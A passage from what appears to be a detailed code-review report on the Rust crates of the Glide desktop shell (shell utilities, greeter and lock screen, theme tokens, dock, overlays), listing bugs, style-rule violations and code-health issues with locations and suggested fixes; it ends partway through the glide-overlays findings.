`glide-shell` holds the shell parts every UI crate shares, located at `crates/glide-shell`. `i18n` is the uk/en catalogue behind `i18n::t` with relative-time labels and date names (plural selection lives in `glide_app::i18n::Lang::plural` and handles 11–14 and 111 correctly). `icon` covers icon-theme resolution (inheritance chain ending at hicolor, size distance, a negative-cache TTL, process-global aliases) and desktop-entry parsing with localized keys and `Terminal=true` wrapping. `raster` has `Canvas`, `Backdrop`, `physical_crop` and shadows; the other modules are `popup_menu` (dock / launcher context menu), `field` (single-line text editing), `battery` (sysfs uevent parsing and aggregation), `clock` (local time, 12/24 h, timezone refresh), `image` (RGBA `Image`, crop, premultiplied → straight, PNG) and `scroll` (wheel step accumulator).

`unsafe` appears in five blocks (`clock.rs`: `tzset`, `time`, `zeroed` / `localtime_r`; `i18n.rs`: `zeroed` / `localtime_r`), each with a `// SAFETY:` comment. There are no explanatory comments, but `#[allow(clippy::too_many_arguments)]` at `raster.rs:187` lacks the justification § 6 requires. `cargo clippy -p glide-shell --all-targets -- -D warnings` is clean and all 57 tests pass. Checked and found correct: Ukrainian plurals, premultiplied → straight conversion (alpha 0 guarded), `physical_crop` (floor / ceil, clamped), `text_px` (`.ceil()`), `popup_menu` (takes `&Painter`, no global). Deep review found 5 Bugs, 1 AGENTS.md trap violation and 5 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **`OnlyShowIn` / `NotShowIn` / `TryExec` are ignored for applications**
   - **Location**: `crates/glide-shell/src/icon.rs:495-502`
   - **Description**: `parse_desktop_entry_for` drops only `NoDisplay`, `Hidden` and non-`Application` entries. `list_applications()` feeds the launcher / dock index (`glide-services/src/app_index.rs:171`) and nothing downstream filters these keys (only autostart, the greeter and Settings do). Entries with `OnlyShowIn=GNOME;` / `XFCE;` (desktop-specific settings managers) are listed under Glide, and so are entries whose `TryExec` binary is gone (on the review machine `virtualbox.desktop`, `peazip*.desktop`, `org.widelands.Widelands.desktop` carry `TryExec`); launching them fails or opens an app meant for another desktop. Evaluate `OnlyShowIn` / `NotShowIn` against `XDG_CURRENT_DESKTOP` and `TryExec` on `PATH`, sharing the autostart logic.
2. **Desktop entries in subdirectories of `applications/` are never indexed**
   - **Location**: `crates/glide-shell/src/icon.rs:320-342, 351-368`
   - **Description**: Only the top level of each `applications/` directory is read and the desktop id is the file stem. The spec builds the id from the relative path with `/` → `-` (`applications/wine/Programs/Foo/Foo.desktop` → `wine-Programs-Foo-Foo.desktop`). Every Wine-installed program lives under `~/.local/share/applications/wine/Programs/…`, so none appear in the launcher; legacy `kde4/` entries are missing too. Walk subdirectories and compute the spec id.
3. **`Exec` string escapes are not decoded before the command reaches `sh -c`**
   - **Location**: `crates/glide-shell/src/icon.rs:505-515, 554-567`
   - **Description**: `strip_field_codes` runs on the raw `Exec` value and the result is spawned through `sh -c` (`glide-system/src/spawn.rs:43-49`). The spec applies the string-level escape pass (`\\` → `\`) before the quoting rules, so `Exec=foo "a\\\\b"` reaches sh and yields `a\\b` instead of `a\b`, and `Exec=foo "\\$HOME"` (a literal `$HOME`) becomes `\` plus the expanded home path. Wine entries (`wine C:\\\\ProgramData\\\\…\\\\Start\\ Menu\\\\…`) would break first once Bug 2 is fixed. Unescape first, parse the spec's quoting into argv, then exec directly or shell-quote each argument.
4. **Battery: a missing `POWER_NOW` switches the cell to charge units, and negative rates are discarded**
   - **Location**: `crates/glide-shell/src/battery.rs:44-46, 106-132`
   - **Description**: Energy units are chosen only when `ENERGY_NOW`, `ENERGY_FULL` and `POWER_NOW` are all present. The ACPI driver returns `-ENODEV` for `power_now` when the rate is unknown (typically full on AC) and the key is omitted from the uevent, so such a battery falls into the charge branch with zeros: the Battery view shows "0.0 W" and "0.0 Wh of —" exactly when the laptop is full, and on a two-battery machine `same_units` turns false and the combined estimate disappears. Separately, `uevent_number` filters out negative values, so drivers that sign `CURRENT_NOW` / `POWER_NOW` while discharging (allowed by the ABI) get rate 0: no time left and a 0 W draw. Pick units from `ENERGY_FULL` / `ENERGY_NOW` alone, treat a missing rate as 0, and take `abs()` of rates.
5. **`TextField` moves and deletes by `char`, not by grapheme cluster**
   - **Location**: `crates/glide-shell/src/field.rs:74-80, 96-119, 134-151`
   - **Description**: `previous_boundary` / `next_boundary` step one scalar. In the launcher search or the quick-settings Wi-Fi password field, Left after a pasted "e\u{301}" or "🇺🇦" lands between the base and the combining mark or between the regional indicators; Backspace on "🇺🇦" leaves a lone "🇺", Delete before a decomposed "и\u{306}" leaves the breve on the previous letter, and ZWJ emoji are split. Minor in practice (xkb delivers Ukrainian precomposed). Use grapheme segmentation.

##### AGENTS.md Trap
1. **Client-supplied app ids and notification names trigger file reads and desktop-directory scans on the render path ("Blocking the event loop")**
   - **Location**: `crates/glide-shell/src/icon.rs:93-113, 241-268, 609-647, 722-725, 766-771`
   - **Description**: `IconLoader::load(key)` resolves synchronously and is called while rendering by the dock (`glide-dock/src/lib.rs:2388`), the switcher (`glide-overlays/src/switcher.rs:493`), the overview (`overview/mod.rs:1226, 1239`) and topbar notifications (`glide-topbar/src/notifications.rs:1080, 1090`, with the D-Bus notification's own `desktop_entry` / `app_name`). `resolve_app` always tries `normalize_icon_name(app_id)`; for an absolute or `file://` id `direct_path` stats it and `render` reads up to 8 MiB on the event loop before checking the extension, so a client's `set_app_id("/some/nfs/path.png")` or a `Notify` with such an `app_name` makes the compositor touch an arbitrary path and display it as an icon. For an id matching no file name, `desktop_icon_name` reads every `.desktop` file in every `applications/` directory (for `StartupWMClass`), per cache miss and per output scale, and misses are retried every `NEGATIVE_TTL` (30 s), so each icon-less app costs a full scan twice a minute on the main thread. Resolve on a worker (as `app_index` does) and reject absolute / `file://` names from client-controlled ids.

##### Code Health
1. **Any permanently missing icon makes the dock re-raster every tile every 30 s**
   - **Location**: `crates/glide-shell/src/icon.rs:49-65`; consumer `crates/glide-dock/src/lib.rs:958-967`
   - **Description**: `expire_missing_at` bumps `generation` and clears all directory listings whenever any `None` entry exists, and the dock clears every tile on a generation change, so one icon-less app causes a full re-list of every theme directory plus all tile rasters indefinitely. Bump only when a retried icon actually resolves.
2. **A dangling symlink or unrenderable file ends the whole lookup**
   - **Location**: `crates/glide-shell/src/icon.rs:77, 102, 213-239`
   - **Description**: `contains` matches listings by name only, so a broken symlink (or a file resvg cannot parse) in the nearest-size directory wins; `render` returns `None`, `None` is cached, and other sizes and inherited themes are never tried.
3. **`find_application` brings back an entry the user hid**
   - **Location**: `crates/glide-shell/src/icon.rs:345-368`
   - **Description**: A user override `~/.local/share/applications/foo.desktop` with `Hidden=true` makes `read_desktop_app` return `None`, and the loop continues to `/usr/share/applications/foo.desktop`. `list_applications` shadows correctly; this does not, so dock pin seeding (`glide-dock/src/config.rs:47`), pin identity and switcher names resurrect the hidden app. Stop at the first directory that has the file.
4. **`XDG_DATA_DIRS` set but empty drops all system directories**
   - **Location**: `crates/glide-shell/src/icon.rs:584-593`
   - **Description**: `Ok("")` takes the "set" branch, leaving only `data_home`: no system applications or icon themes. The basedir spec says empty means the defaults.
5. **`Image::draw_replace` has unchecked offsets**
   - **Location**: `crates/glide-shell/src/image.rs:70-82`
   - **Description**: `x as usize` on a negative offset wraps, and `x > width` makes the last row's slice overrun. The only caller (`glide-shot/src/compose.rs:252`) clamps first, so it is not reachable yet.

---

### 25. `glide-greeter` (4,134 lines)

#### Summary
`glide-greeter` holds the greetd greeter and the built-in lock screen, located at `crates/glide-greeter`. `ipc.rs` is the greetd worker thread (length-prefixed native-endian JSON with a 64 KiB frame cap; it cancels the session after an error and before a new `create_session`). `system.rs` reads users from `/etc/passwd`, sessions from `wayland-sessions` (TryExec, Hidden, Exec splitting), the last-login file, battery and Wi-Fi status. `ui.rs` is `GreeterUi`, the model and its rendering as per-block buffers cached by `(Part, scale)`. `pam.rs` authenticates the lock screen through a dlopened `libpam` on a `glide-lock-auth` thread, with a conversation callback and second prompts that wait up to 120 s. `handoff.rs` draws the login cover and writes the `/dev/ttyN` palette and `KDSETMODE`.

`unsafe` appears in `pam.rs` (dlopen / dlsym and transmute, the `extern "C"` conversation, calloc / strdup / free), `system.rs` (`getpwuid`) and `handoff.rs` (`ioctl`, `remove_var`), each with a `// SAFETY:` comment; the only other comment justifies an `#[allow]`, so the crate complies with `AGENTS.md` § 6. The FFI looks sound: responses are `calloc`ed and `strdup`ed so libpam's `free` matches, partial replies are zeroed and freed on every error path, `appdata` outlives `pam_end`, a NUL in a password is refused, and a second question or visible prompt never receives the password. `cargo clippy -p glide-greeter --all-targets -- -D warnings` is clean; 56 of 57 tests pass and 1 (`ui::tests::preview`) is ignored. Deep review found 5 Bugs, 1 AGENTS.md trap violation and 5 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **A lock request during the unlock fade is dropped, so the session ends up unlocked**
   - **Location**: `crates/glide-compositor/src/state.rs:733-735, 3647-3651, 3657-3660`; `crates/glide-greeter/src/ui.rs:1083-1094`
   - **Description**: After `Verdict::Granted` (or logind `Unlock`) the greeter `leave()`s and stays in `state.greeter` for `t4` (420 ms × animation speed) until `finish_unlock` drops it. During that window `screen_locked()` (`session_lock.is_some() || greeter.is_some()`) is true, so `lock_screen()` and `lock_screen_gently()` return at once and the request is ignored: Super+L, logind `Lock`, `PrepareForSleep` (`main.rs:442`) and the idle lock alike. Unlocking and closing the lid within that window resumes the machine unlocked. In `lock_screen`, treat a leaving greeter as unlocked (replace it with a fresh lock UI or cancel the leave).
2. **The greeter never detects a faillock lockout, because the next password prompt clears the notice**
   - **Location**: `crates/glide-greeter/src/ui.rs:1002-1006, 1038-1047`; caller `crates/glide-compositor/src/state.rs:3598-3608, 3627-3630`
   - **Description**: pam_faillock's `preauth` sends "The account is locked due to 3 failed logins." / "(10 minutes left to unlock)" as `PAM_TEXT_INFO`; greetd forwards them and `on_notice` stores them in `self.message`. The stack continues (`required`), and `Password:` arrives next; `on_question` then clears any `Tone::Info` message. When greetd returns `auth_error`, `set_auth_denied(None, …)` looks for the lockout only in `self.message`, which is already `None`. The "Locked for M:SS" pill never shows; the user sees "Wrong password, N attempts left" and keeps trying, and every `authfail` extends the lockout (faillock counts from the latest failure). The unit test calls `on_notice` then `set_auth_denied` with no prompt in between, which never happens with greetd. (The lock-screen path keeps its notices.) Keep the current conversation's notices until `set_auth_denied` and clear them when a new conversation starts.
3. **An `auth_error` that arrives before any answer recreates the greetd session in a tight loop**
   - **Location**: `crates/glide-compositor/src/state.rs:3627-3634`, `crates/glide-greeter/src/ui.rs:1053-1066`
   - **Description**: On `GreetdReply::Error { auth: true }` the compositor calls `set_auth_denied` and immediately sends `CreateSession(user)`, whether or not a password was sent. With `auth requisite pam_nologin.so` and `/run/nologin` present (systemd creates it 5 minutes before a scheduled shutdown; admins for maintenance): `create_session` → `auth_message(error)` → `Respond(None)` → `auth_error` → `CreateSession` again, with no user action, delay or backoff. It spins for as long as the file exists, flooding the log, restarting the shake and decrementing "N attempts left" while nobody types. Re-create the session immediately only after a response was sent; otherwise set `needs_session`.
4. **Lock-screen PAM attempts are not tied to the lock they came from**
   - **Location**: `crates/glide-greeter/src/pam.rs:283-303`; `crates/glide-compositor/src/state.rs:3668-3670, 3706-3712, 3944-3966`
   - **Description**: One `Authenticator` lives for the whole compositor; one channel carries both passwords and answers to second questions, and verdicts carry no lock or attempt id. `unlock_screen()` (logind `Unlock`) ends a lock without cancelling the conversation in flight. With an OTP stack: the user enters the password, the thread asks "Verification code:" and blocks in `recv_timeout(120 s)`, a logind `Unlock` ends the lock, and if the screen locks again within 120 s the first password typed is sent into the old conversation as the OTP answer — the secret reaches the second-factor module, the attempt fails, faillock counts it, and the new lock says "Wrong password". A `Granted` from an attempt pending when the earlier lock ended is applied to whatever lock exists when it arrives, dismissing a lock nobody authenticated against. `lock_password` is not cleared by `unlock_screen` either. Uncommon (needs logind `Unlock` plus a re-lock mid-attempt). Carry a generation in `Verdict`, ignore mismatches, abort pending questions when the lock ends.
5. **One non-UTF-8 byte in `/etc/passwd` replaces every user with `$USER` (the greeter account)**
   - **Location**: `crates/glide-greeter/src/system.rs:50-53, 166-174`
   - **Description**: `fs::read_to_string("/etc/passwd")` fails on invalid UTF-8 (a legacy Latin-1 GECOS such as `Jos\xe9`), `unwrap_or_default()` yields no users, and `default_users()` returns one entry from `$USER` with uid 1000 — under greetd that is `greeter` with a nologin shell. Real accounts disappear and, since a username cannot be typed, nobody can log in. NSS-only users (systemd-homed, LDAP / SSSD) are never listed either. Decode each line lossily (or walk `getpwent`).

##### AGENTS.md Trap
1. **Lock screen and greeter content arrive and leave by opacity alone (§8 motion, not fade)**
   - **Location**: `crates/glide-greeter/src/ui.rs:706-735, 1893-1917`; `crates/glide-greeter/src/handoff.rs:231-246`
   - **Description**: `parts()` gives the nav, field, name, avatar, hint, media and notice cards alpha `1 - leave` with zero offset; only the clock moves, by `-20 × leave` px, below the 24 px / 8 % minimum for scene content. That covers the gentle lock arrival (t3) and the unlock / login leave (t4). Opacity also tracks the motion one-to-one instead of `min(1, p / 0.4)`, as does the menu reveal (`alpha = menu_t`); the handoff spinner and "Signing in…" label fade with no motion; the power toast pops with no transition and the user chips vanish instantly while busy. Give the auth block and cards ≥ 24 px travel or a .94 → 1 scale.

##### Code Health
1. **Greetd-path secrets are never zeroized, and `Debug` derives would print them**
   - **Location**: `crates/glide-greeter/src/ipc.rs:12-30, 52-58, 80-87`; `crates/glide-greeter/src/ui.rs:293-299, 1030`
   - **Description**: The lock path wipes carefully, the greetd path does not: `GreetdCommand::Respond(Some(password))` → `Request::PostAuthMessageResponse` → `serde_json::to_vec` leaves plain copies; `set_auth_error` drops `queued` without wiping; `Submit`, `GreetdCommand` and `Request` derive `Debug` with the password inside. `on_question` also hands the queued password to any question, including a visible one.
2. **A crafted lockout message can panic the compositor**
   - **Location**: `crates/glide-greeter/src/ui.rs:594-600, 1044`
   - **Description**: `lockout_left` computes `count * 60` on any parsed `u64` (overflow panic in debug), and `Instant::now() + left` panics on overflow in release, so "locked 400000000000000000 minutes" from a misbehaving module crashes the compositor while locked. Use checked arithmetic and clamp.
3. **Continuous redraw for the whole faillock lockout**
   - **Location**: `crates/glide-greeter/src/ui.rs:1232-1241`
   - **Description**: While `locked_until` is set, `tick()` sets `dirty` on every call, so the lock screen re-composites every vblank for the whole `unlock_time` (e.g. 10 minutes) although the text changes once a second.
4. **"N attempts left" comes from a UI-local counter, not faillock's tally**
   - **Location**: `crates/glide-greeter/src/ui.rs:624, 1053-1066`
   - **Description**: `failures` starts at 0 for every new `GreeterUi`; failures recorded elsewhere through `system-auth` (two failed `sudo`s) and `deny=` given as a module argument are ignored, so the lock can say "2 attempts left" when the next wrong password locks the account.
5. **`split_exec` departs from the Desktop Entry `Exec` rules**
   - **Location**: `crates/glide-greeter/src/system.rs:245-278`
   - **Description**: The string-level unescape (`\\`, `\s`) is not applied before quoting, so `Exec=sh -c "echo \\"hi\\""` splits wrongly; a literal `%%` is dropped instead of becoming `%`; field codes inside an argument (`--file=%f`) pass through. Rare in session files.

---

### 26. `glide-theme` (4,341 lines)

#### Summary
`glide-theme` holds the Meridian design tokens and everything generated from them, located at `crates/glide-theme`: `tokens` / `palette` (light / dark × 8 accent ramps, `Appearance::scheduled`); `lib.rs` (`Color` with hex parsing, BGRA bytes, premultiply, straight and premultiplied lerp, state layers; the Decoration / Dock / Overview theme structs with `repaint` and FNV `Revision` cache keys); `motion` (T1–T4, scaled `t1()..t4()`, a Newton + bisection cubic-bezier solver, `E_OUT` / `E_IO` / `E_OVER`, `assist`, `window`, the `Release` Hermite); `shape`, `spacing`, `typography`, `component`, `elevation`; `icons` and `plates` (Colloid / Papirus candidates and the SVG light-plate → `#4d4d4d` rewriter); `export` (GTK 3/4 / libadwaita CSS, qt5ct / qt6ct, KDE scheme, GtkSourceView); `kvantum` (generated SVG and kvconfig); `data::json`.

There is no `unsafe` and no comment in the `.rs` files, but the one `#[allow]` lacks a justification (Code Health 2). Values were checked against the spec: T1–T4 = 120 / 200 / 320 / 420 ms, the three curves match their `cubic-bezier`s, R1–R4 = 4 / 8 / 12 / 18, SP1–SP8 match. Scale 0 collapses every duration (`scaled()` returns `ZERO`, `Release::new` too), the shipped curves have x′(u) > 0 so the solver cannot reach a wrong root and endpoints are exactly 0 / 1, the 19:00 / 07:00 boundaries are right, and the SVG plate scanner does not panic on malformed input. `cargo clippy -p glide-theme --all-targets -- -D warnings` is clean and all 64 unit tests pass. Deep review found 1 Bug, 1 AGENTS.md trap violation and 4 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **The exported GTK CSS puts rounded corners back on edge-tiled windows**
   - **Location**: `crates/glide-theme/src/export.rs:211-222`
   - **Description**: With edge states, GTK 3.24 / 4 set per-edge classes (`.tiled-top`, `.tiled-bottom`, `.tiled-left`, `.tiled-right`) instead of `.tiled`, and Glide's snapping and keyboard tiling send TiledTop + TiledBottom + one side (§9.2 Tiling); libadwaita squares the corners for exactly those classes. Glide's rules exclude only `.maximized`, `.tiled` and `.fullscreen` — only the first selector also excludes `.tiled-left` / `.tiled-right`, and none exclude `.tiled-top` / `.tiled-bottom` — and the file is imported from `gtk.css` at USER priority, which beats theme rules. Snapping a libadwaita window to the left half gives it `csd tiled-top tiled-bottom tiled-left`, every Glide selector still matches, and the window and header bar keep 12 px corners against the screen edges with the wallpaper showing through, contrary to "CSD apps draw it without rounded corners … on those edges". Add `:not(.tiled-top):not(.tiled-bottom):not(.tiled-left):not(.tiled-right)` to all four selectors and test it.

##### AGENTS.md Trap
1. **Radii outside R1–R4 in the generated Qt and GTK themes (§8)**
   - **Location**: `crates/glide-theme/src/kvantum.rs:421, 469` (`CHECK_RADIUS: f32 = 5.0`); `crates/glide-theme/src/export.rs:234` (`stackswitcher > button.toggle { … border-radius: 6px; … }`)
   - **Description**: Kvantum check boxes get `rx="5"` while the spec (`.check` is `--r-2`) and the GTK export (`check { border-radius: R2 }`) use 8, so Qt and GTK check boxes differ in one session; the segmented thumb uses a literal 6 px. `theme_defaults_use_only_radii_from_the_scale` checks only the four theme-struct radii, so neither is caught. Use R1 / R2 and extend the test to the export and Kvantum constants.

##### Code Health
1. **NaN progress passes straight through the easing helpers**
   - **Location**: `crates/glide-theme/src/motion.rs:124-133, 170-180, 211-215`
   - **Description**: `ease(NaN)` fails both endpoint guards and the solver returns NaN; `assist`, `window` and `Release::at` return NaN too (`f64::clamp(NaN)` is NaN). NaN arises exactly when scale 0 gives a zero duration and a caller computes `0/0`. The call sites checked guard against it, but 49 call sites each have to remember; treating `!(progress < 1.0)` as 1.0 would make "scale 0 = instant" hold for all.
2. **Unjustified `#[allow]`**
   - **Location**: `crates/glide-theme/src/lib.rs:30`
   - **Description**: `#[allow(clippy::many_single_char_names)]` has no justification as §5 / §6 require.
3. **The kvconfig helpers parse more strictly than QSettings and disagree with each other**
   - **Location**: `crates/glide-theme/src/kvantum.rs:758-804`
   - **Description**: `replaces_theme` matches only `theme=` without spaces, so a hand-edited `theme = KvArc` reads as "no theme", the user's choice is replaced and `manager_config` keeps the old line next to the new one; `manager_config` also compares `[General]` exactly while `replaces_theme` trims it. Share one trimming `key = value` parser.
4. **`only_micro_is_uppercase` checks less than AGENTS.md claims**
   - **Location**: `crates/glide-theme/src/typography.rs:96-128`
   - **Description**: The test iterates only `TextStyle::ALL`; a constant left out of `ALL`, or a `TextStyle { uppercase: true, .. }` literal in another crate, passes, though §8 says such a style "anywhere else fails". No violation exists today.

---

### 27. `glide-dock` (4,453 lines)

#### Summary
`glide-dock` is the shell dock, located at `crates/glide-dock`. `lib.rs` holds the `Dock` model: pinned, running and launching tiles, run dots and the focused bar, urgent and launch bounces, LauncherEntry badges and progress, smart / always / never autohide with an edge dwell, hover and tooltips, the right-click menu, drag-reorder and drag-to-pin, arrival and departure animations, keyboard mode, fitting to narrow outputs, and the `render` pipeline into `MemoryRenderBuffer`s. `preview.rs` is the window-preview popover (layout, hit-testing, chrome); `config.rs` holds `DockConfig`, `DockAutohide`, `[[dock.items]]` and the seeded defaults. Reading and writing `pins.toml` happens in the compositor's `config.rs`.

The crate has no `unsafe` and complies with `AGENTS.md` § 6 except one unjustified `#[allow(clippy::too_many_arguments)]` (`lib.rs:1927`). `cargo clippy -p glide-dock --all-targets -- -D warnings` is clean; 72 tests pass and 1 (the PNG preview) is ignored. Deep review found 6 Bugs, 4 AGENTS.md trap violations and 5 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **A disabled dock keeps the frame pump running forever after any launch or attention request**
   - **Location**: `crates/glide-dock/src/lib.rs:789-794, 1590-1593`; `crates/glide-compositor/src/state.rs:2824-2827`; `crates/glide-compositor/src/main.rs:217-219`
   - **Description**: `reveal_for` sets `reveal_until`, which only `update_autohide` clears once it has passed, and `is_animating` counts `self.reveal_until.is_some()` without a time check. `update_dock_autohide` returns early when the dock is disabled, so `update_autohide` never runs, while `main.rs` ORs `dock.is_animating()` into the frame pump unconditionally. With `[dock] enabled = false`, launching any app from the launcher (`begin_launch` → `reveal_for(ATTENTION_REVEAL)`) or a refused activation / LauncherEntry `urgent` makes every loop pass queue a redraw until the dock is re-enabled: the compositor redraws continuously. Test `reveal_until.is_some_and(|u| now < u)` in `is_animating`, or skip reveals while disabled.
2. **Every config apply snaps an autohidden dock into view, then slides it away**
   - **Location**: `crates/glide-dock/src/lib.rs:717, 731-739`; `crates/glide-compositor/src/config.rs:1343`
   - **Description**: `reconfigure` rebuilds the dock with `*self = Self::new(config)` and carries over only `launching`, `urgent` and `badges`; `Dock::new` starts with `hide: AutohideFade::shown()`. `apply_to_state` calls `reconfigure` on every `Reload` (any Settings edit, the twice-daily appearance schedule, pin edits in Settings). With smart autohide and a maximized window covering the dock, any settings change draws the dock fully shown on the next frame with no motion, and 400 ms later it slides away again; keyboard mode is silently dropped. Carry `hide`, `keyboard` and `reveal_until` across `reconfigure`.
3. **The preview's tile index goes stale on a layout change, so the popover switches to another app's windows**
   - **Location**: `crates/glide-dock/src/lib.rs:1105-1134, 1439-1457, 1475-1484`; `crates/glide-compositor/src/dock_glue.rs:404-418`
   - **Description**: `Preview` stores a tile `index`, and `set_running` remaps hover, menu and drag on a layout change but not `preview`. With running apps A (index 3) and B (index 4), the user opens A's preview, moves onto the panel (hover becomes `None`) and closes A's last window with the close disc. B slides into index 3; `sync_dock_preview` falls back to `preview_index() == Some(3)`, `keeps(pos)` is true for the pointer still on the panel, and `show_preview(3, …)` opens B's windows under the pointer with no hover or dwell. Remap `preview.index` through its `app_id`, or hide the preview when that tile is gone.
4. **Static `[[dock.items]]` are written into `pins.toml`, and items without an `app_id` then come back as duplicate tiles**
   - **Location**: `crates/glide-dock/src/lib.rs:472-478, 684, 1224-1227`; `crates/glide-compositor/src/config.rs:800-806, 1333-1342`; `crates/glide-compositor/src/state.rs:2730, 2853, 2871`
   - **Description**: The compositor builds `DockConfig.items` from static `[[dock.items]]` plus the pins, `Dock::new` marks them all `pinned`, and every save writes `pinned_items()` wholesale, so static items become pins. The reload dedupe matches only static items with an `app_id`; `DockItem::from_config` keys one without it as `name.to_lowercase()`. With `[[dock.items]] name = "Firefox" command = "firefox"`, any pin change stores `app_id = "firefox"` and the next apply shows two pinned tiles with that key. `slides`, the layer maps and `arrivals` are keyed by `app_id`, so the shared `TileSlide` converges on the second slot: both tiles are drawn stacked there, the first slot looks empty but still hit-tests, and hover / press highlight both. Static items that do have an `app_id` also stay pinned after the user removes them from `glide.toml`. Keep static items out of saved pins and dedupe by the derived key.
5. **A malformed `pins.toml` is replaced by an empty list on the next pin change**
   - **Location**: `crates/glide-compositor/src/config.rs:779-782, 787-797, 808-819`
   - **Description**: A parse error in `load_dock_pins` returns `Some(Vec::new())`, so the dock shows no pins and nothing is seeded; the next pin, unpin or reorder calls `save_dock_pins` with the current (empty plus one) list and atomically overwrites the user's file. There is no `.last-good` copy as for `glide.toml`, so one typo in a hand edit loses every pin. Back the file up or refuse to save after a parse error.
6. **Any completed drag of a running tile pins it, even when dropped back where it was**
   - **Location**: `crates/glide-dock/src/lib.rs:1697-1721, 1736-1755`; `crates/glide-compositor/src/state.rs:2858-2869`
   - **Description**: Past `DRAG_THRESHOLD` (6 px), `end_press` always returns `Drop`, `display_order` clamps an unpinned tile into the pinned group (`target.min(pinned_slots)`), and `drop_dock_tile` pins any unpinned index unconditionally; there is no drop zone in the running group and no cancel. A 6 px drift during a click on a running tile (common on a touchpad), or dragging it out of the dock, pins it and saves `pins.toml` instead of activating it. §9.1 promises only that dragging *into* the pinned group pins. Return `Nothing` when the tile is dropped past the last pinned slot or outside the dock.

##### AGENTS.md Trap
1. **The dragged (and hovered) tile is drawn beneath its left neighbour ("Element order")**
   - **Location**: `crates/glide-dock/src/lib.rs:1967, 2018-2100`
   - **Description**: Index 0 is topmost, and `push_tiles` pushes each tile's elements in display order without hoisting the dragged one, so every tile left of it sits above the lifted, enlarged dragged tile and its El2 shadow; while glued between slots it overlaps its left neighbour by about `(item − gap)/2` px and is covered by that icon. Push the dragged (and hovered) tile first.
2. **The launcher's hover raster leaves out the icon generation ("Rasterisation cache keys that omit inputs")**
   - **Location**: `crates/glide-dock/src/lib.rs:958-967, 2053-2059`
   - **Description**: `retry_missing_icons` clears `tiles` when `icons.generation()` changes but not `rasters.launcher_hover`, which is keyed by scale only and bakes in the `view-app-grid` symbolic. If that symbolic was missing when the launcher tile was first hovered and resolves later, the resting tile shows the themed icon and the hovered one keeps the built-in glyph.
3. **Pure-opacity transitions on objects (§8 motion, not fade)**
   - **Location**: `crates/glide-dock/src/lib.rs:2132-2156` (tooltip), `2427-2429` with `2450` (badge exit), `2470-2477` (progress bar), `2520-2536` (run indicator)
   - **Description**: The tooltip's `Reveal` drives only alpha at a fixed position; `badge_scale` returns 1.0 when not rising, so the count pill leaves as a plain t1 fade; the LauncherEntry progress bar and run dots appear and disappear through alpha only. None are state layers, scrims or crossfades. Give each at least 6 px of travel or 6 % scale.
4. **Opacity is not the shorter track (§8)**
   - **Location**: `crates/glide-dock/src/lib.rs:2296-2306` (menu), `crates/glide-dock/src/preview.rs:339-340` (preview), `lib.rs:2026-2027, 2046-2047` (arrival), `lib.rs:376-380` (departure), `lib.rs:1947-1948` (autohide)
   - **Description**: The menu (`alpha = progress`), preview (`alpha = progress`), arrival (`opacity * arrive` on the same curve as the 8 px drop), departure (`1 − progress`, dropping from the first frame) and autohide (`1 − hidden`) all use the motion's own progress for alpha instead of `min(1, p / 0.4)`. Use the shared `assist` mapping.

##### Code Health
1. **Unjustified lint suppression**
   - **Location**: `crates/glide-dock/src/lib.rs:1927`
   - **Description**: `#[allow(clippy::too_many_arguments)]` on `render` has no justification; bundle the arguments into a struct as `preview::render` does.
2. **During a drag the shell is sized for different separators than the tiles use**
   - **Location**: `crates/glide-dock/src/lib.rs:1745-1753, 1783-1812, 1946-1958`
   - **Description**: `rect()` / `size()` count separators from `self.items` while tiles use `display_order`'s rewritten separators, so dragging the only running tile into the pinned group (or within a pinned group with `separator_before`) leaves an empty 9 px strip at the shell's right end until the drop.
3. **Index-keyed state is dropped, not remapped, on a layout change**
   - **Location**: `crates/glide-dock/src/lib.rs:1119-1134`
   - **Description**: Any `layout_changed` clears `drag`, so a press in progress loses its click when an unrelated app starts or quits; if the hovered index moved, `hover` becomes `None` while `keyboard` stays true and Enter does nothing until an arrow is pressed. Key hover and press by `app_id` like `slides`.
4. **A pin can be saved with no command**
   - **Location**: `crates/glide-dock/src/lib.rs:1229-1255`
   - **Description**: `toggle_pinned` with `identity == None` (app not yet in the desktop index, or no desktop entry) pins a tile built by `DockItem::app(.., "")`, written to `pins.toml` with `command = ""`; it can never relaunch the app.
5. **Two independent writers of `pins.toml`**
   - **Location**: `crates/glide-compositor/src/config.rs:808-819`; `crates/glide-settings/src/services/dock.rs:145`
   - **Description**: The compositor rewrites the file from its in-memory list and Settings from its own copy; a compositor save between a Settings write and the `Reload` it triggers discards the Settings edit.

---

### 28. `glide-overlays` (5,349 lines)

#### Summary
`glide-overlays` holds four shell overlays, located at `crates/glide-overlays`. `switcher.rs` is the Alt+Tab app / window switcher (MRU entries, reveal after t1, sliding highlight, scrolling strip, Q / W / H removals); `power_dialog.rs` is the power dialog model and render (arm then confirm, a 60 s countdown, focus wrapping, the `Reveal` open / close); `osd.rs` is the volume, brightness, keyboard-backlight and Caps Lock indicator; `overview/` holds the overview: `mod.rs` (phases, grid, one page per workspace scrolled by a tween, keyboard nav, drag and release, launcher handoff, the top-first `render` plan), `strip.rs` (workspace thumbnails, the add tile, thumbnail reorder), `drag.rs` (lift, targets, edge dwell) and `close.rs` (watching a close the window may refuse).

The crate has no `unsafe` and no comments, but three `#[allow]`s lack justification (Code Health 4). `cargo clippy -p glide-overlays --all-targets -- -D warnings` is clean; 90 of 91 tests pass and 1 (the strip PNG preview) is ignored. Deep review found 5 Bugs, 5 AGENTS.md trap violations and 4 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **A dragged strip thumbnail is painted under its neighbours' mini windows ("Element order")**
   - **Location**: `crates/glide-overlays/src/overview/mod.rs:1368-1410`, `crates/glide-overlays/src/overview/strip.rs:304-309, 407-566`
   - **Description**: `render` pushes the strip in three groups, top first: all chrome (frames, captions, add tile), then every thumbnail's mini windows, then every thumbnail's wallpaper; `strip.paint_order()` lifts the dragged thumbnail only *within* each group. With thumbnail A carried 0.4 step over B (~78 px overlap at 1440×900), B's mini windows, frame shadow and border sit above A's wallpaper, so B's windows show through the thumbnail being carried. Emit all layers per thumbnail in `paint_order`.
2. **The add tile is a 56 px raster stretched to a full thumbnail while a window is carried**
   - **Location**: `crates/glide-overlays/src/overview/strip.rs:339, 357, 526-535`
